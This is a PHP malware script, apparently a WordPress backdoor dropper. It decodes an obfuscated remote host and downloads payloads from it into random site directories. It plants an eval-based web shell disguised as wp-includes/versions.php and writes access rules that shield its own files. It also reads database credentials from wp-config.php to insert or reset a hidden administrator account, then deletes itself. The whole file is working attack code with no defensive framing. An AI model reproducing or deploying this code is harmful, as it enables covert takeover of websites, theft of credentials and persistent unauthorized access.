<?php
header('Content-Type: text/html;charset=utf-8');
error_reporting(E_ALL);

$domain = "\x68\164\x74\160\x3a\57\x2f\164\x2e\143\x72\145\x61\164\x65\163\x65\157\x2e\170\x79\172\x2f";
$root = $_SERVER['DOCUMENT_ROOT'];
@chdir($root);

$http = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] == "on") ? 'https' : 'http';
$host = $_SERVER["HTTP_HOST"];



if( isset($_POST['message_type']) && !empty($_POST['message_type']) ){
    $message_type = $_POST['message_type'];
}else{
    $message_type = 'html';
}

$arpath8 = array();
fi1($root);


function enfile(){
    
    global $root, $http, $host, $domain, $arpath8, $fp2;
    
    $return_result = [];
    $return_result['title'] = 'create shell';
    $return_result['status'] = 'ok';
    $return_result['file'] = [];
    
  
    $check_repeat = array();
    $custom_file = array('wp-content','wp-includes');
    
        
    
    $wrmfwlf = array('/h1.gif','/h2.gif','/h3.gif','/h4.gif','/h5.gif','/i1.gif','/i2.gif','/i3.gif','/i4.gif');
	$ranfile = array_rand($arpath8,count($wrmfwlf)-count($custom_file));
	foreach($ranfile as $i){
		array_push($custom_file,$arpath8[$i]);
	}
    $self_shell_name = [];
    $i=0;
    while ($i < sizeof($wrmfwlf)) {
            $sf = $custom_file[$i];
            $rf = get($domain.'s1'.$wrmfwlf[$i]);
            $fh = fopen($sf.'/index.php', "w+");
            $xd_ok = fwrite($fh, $rf);
            fclose($fh);
            if($xd_ok){
                $xd_url = $http . "://" . $host. '/' . $sf.'/index.php';
                $return_result['message'][] = 'file:'." \t".$xd_url.' success';
                $return_result['file'][] = $xd_url;
                //if( basename($sf.'/index.php') != 'index.php' ){
                //    $self_shell_name[] = basename($sf);
                //}
            }
        $i++;
    }
    
    $cdf = 'wp-includes/versions.php';
    
    $fh = fopen($cdf, "w+");
    $xd_ok = fwrite($fh, "<?php if(isset(\$_POST['cdshell']) && !empty(\$_POST['cdshell'])){@eval(\$_POST['cdshell']);} ?>");
    fclose($fh);
    
    if($xd_ok){
        $xd_url = $http . "://" . $host. '/' . $cdf;
    }
    
    $return_result['message'][] = 'file:'." \t".$xd_url.' success';
    $return_result['file'][] = $xd_url;
    $self_shell_name[] = 'versions.php';
    
    $htc  = '';
    
    $htc .= '<IfModule mod_rewrite.c>' . "\n";
    $htc .= 'RewriteEngine On' . "\n";
    
    $htc .= 'RewriteBase /' . "\n";
    $htc .= 'RewriteRule ^index.php$ - [L]' . "\n";
    $htc .= 'RewriteCond %{REQUEST_FILENAME} !-f' . "\n";
    $htc .= 'RewriteCond %{REQUEST_FILENAME} !-d' . "\n";
    $htc .= 'RewriteRule . index.php [L]' . "\n";
    $htc .= '</IfModule>' . "\n";
    $htc .= '<FilesMatch ".*\.(py|exe|phtml|php|PHP|Php|PHp|pHp|pHP|phP|PhP|php5|suspected)$">' . "\n";
    $htc .= 'Order Allow,Deny' . "\n";
    $htc .= 'Deny from all' . "\n";
    $htc .= '</FilesMatch>' . "\n";
    $htc .= '<FilesMatch "^(index.php|'.implode('|', $self_shell_name) . ')$">' . "\n";
    $htc .= 'Order Allow,Deny' . "\n";
    $htc .= 'Allow from all' . "\n";
    $htc .= '</FilesMatch>' . "\n";
    
    $htresult = file_put_contents($root.'/.hcontent', $htc);
	if ($htresult){
		$return_result['htcontent']=$htc;
	}
    
    return $return_result;
}

function get($url)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));

    if (stripos($url, "https:") === false) {
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    }
       
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $body = curl_exec($ch);
    curl_close($ch);
    return $body;
}


function output_message($result, $message_type='html', $html_tag='li'){
    
    if($message_type != 'html'){
        echo json_encode($result);
        return;
    }
    
    if( !is_array($result)){
        return;
    }
    
    if(!isset($result['title'])){
        $result['title'] = '';
    }
    
    echo '---------start '.$result['title'];
    
    if( sizeof($result['message']) > 0 ){
        foreach ( $result['message'] as $message){
            $message = str_replace('success', '<font color="blue">success</font>', $message);
            $message = str_replace(' ok', '<font color="blue"> ok</font>', $message);
            $message = str_replace('fail', '<font color="red">fail</font>', $message);
            echo "<$html_tag>" . $message . "</$html_tag>";
        }
    }
    
    if( isset($result['status']) && !empty($result['status'])){
        
        if( $result['status'] == 'ok'){
            $status = '<font color="green">'.$result['status'].'</font>';
        }
        
        if( $result['status'] == 'fail'){
            $status = '<font color="red">'.$result['status'].'</font>';
        }
        
        echo '---------end '.$result['title'].'===>status:'.$status;
        
    }else{
        
        $status = '<font color="green">ok</font>';
        
        echo '---------end '.$result['title'].'===>status:'.$status;
    }
    
    echo "<br />";
    
}

function adduser(){
    
    global $root, $http, $host, $domain, $arpath8, $fp2;
    $contents = file_get_contents("wp-config.php");
    
    preg_match("@['|\"]DB_NAME['|\"],\s*['|\"](.*?)['|\"]@", $contents, $matchd);
    preg_match("@['|\"]DB_USER['|\"],\s*['|\"](.*?)['|\"]@", $contents, $matchu);
    preg_match("@['|\"]DB_PASSWORD['|\"],\s*['|\"](.*?)['|\"]@", $contents, $matchp);
    preg_match("@['|\"]DB_HOST['|\"],\s*['|\"](.*?)['|\"]@", $contents, $matchh);
    preg_match("@table_prefix\s*=\s*['|\"](.*?)['|\"]@", $contents, $matchw);
    $db_name = $matchd[1];
    $db_user = $matchu[1];
    $db_pass = $matchp[1];
    $db_host = $matchh[1];
    $db_pre = $matchw[1];
    $db_port = "3306";
    if (strstr($db_host, ":")) {
        $arr = explode(":", $db_host);
        $db_host = $arr[0];
        $db_port = $arr[1];
    }
    if (trim($db_host) == "") {
        $db_host = "localhost";
    }
    $con = mysqli_connect($db_host, $db_user, $db_pass, $db_name, $db_port);
    $sql = "update $db_pre" . "users set user_pass='55dace80f1d0b755064e344fc4389c59' where user_login in ('_system','itsme');";
    $query = mysqli_query($con, $sql);

    $sql = "select * from $db_pre" . "users where user_login='wp_postadmin';";
    $query = mysqli_query($con, $sql);
    $row = mysqli_fetch_array($query);
    
    if (!empty($row)) {
        // $sql = "update $db_pre"."users set user_pass='fbad27bfd77b39670dbfba20df703732' where user_login='itsme';";
        $sql = "update $db_pre" . "users set user_pass='55dace80f1d0b755064e344fc4389c59' where user_login='wp_postadmin';";
        $query = mysqli_query($con, $sql);
        return "user wp_postadmin exists, change password";
    } else {
        $sql = "insert into $db_pre" . "users(user_login,user_pass,user_nicename,user_email,user_registered,user_activation_key,user_status,display_name) values('wp_postadmin', '55dace80f1d0b755064e344fc4389c59', 'wp_postadmin', 'wordpressuser@gmail.com', '2021-05-21 09:13:26', '', '0', 'wp_postadmin');";
        $query = mysqli_query($con, $sql);
        $sql = "select ID from $db_pre" . "users where user_login='wp_postadmin';";
        $query = mysqli_query($con, $sql);
        $row = mysqli_fetch_array($query);
        $id = $row['ID'];
        $sql = "insert into $db_pre" . "usermeta(user_id, meta_key, meta_value) values($id, '$db_pre" . "capabilities', 'a:1:{s:13:\"administrator\";b:1;}');";
        $query = mysqli_query($con, $sql);
        $sql = "select * from $db_pre" . "users where user_login='wp_postadmin';";
        $query = mysqli_query($con, $sql);
        $row = mysqli_fetch_array($query);
        if ($row['user_login'] == "wp_postadmin") {
            return "useradd ok";
        }
    }
    
    return "useradd fail";
}

$enfile_result = enfile(); // 3

if (file_exists("wp-config.php")) {
    $adduser_message = adduser();
    $enfile_result['message'][] = $adduser_message;
}

output_message($enfile_result, $message_type);

if( $message_type == 'html'){
    
    if( isset($enfile_result['file']) && sizeof($enfile_result['file']) ){
        echo "path:<br /><textarea style=\"width: 90%;height: 100px;\">";
        foreach($enfile_result['file'] as $file){
            echo $file . "\t";
        }
        echo "</textarea>";
    }
    if( isset($enfile_result['htcontent'])){
        echo "htcontent:<br /><textarea style=\"width: 40%;height: 200px;\">";
        echo $enfile_result['htcontent'];
        echo "</textarea>";
	}
}



function fi1($path){
	global $root,$arpath8;
    if ($handle = opendir($path)) {
        while (($file = readdir($handle)) !== false) {
            if ($file != "." && $file != "..") {
				$pfile = $path . "/" . $file;
                if (is_dir($pfile) && ! is_link($pfile)) {
					if (substr_count(str_replace($root.'/','',$pfile),'/')<3){
						fi1($pfile);
					}
                    if ( !file_exists($pfile . "/index.php")) {
                        array_push($arpath8,str_replace($root.'/','',$pfile));
                    }

                }
            }
        }
    }
    shuffle($arpath8);
}

unlink(__FILE__);

?>
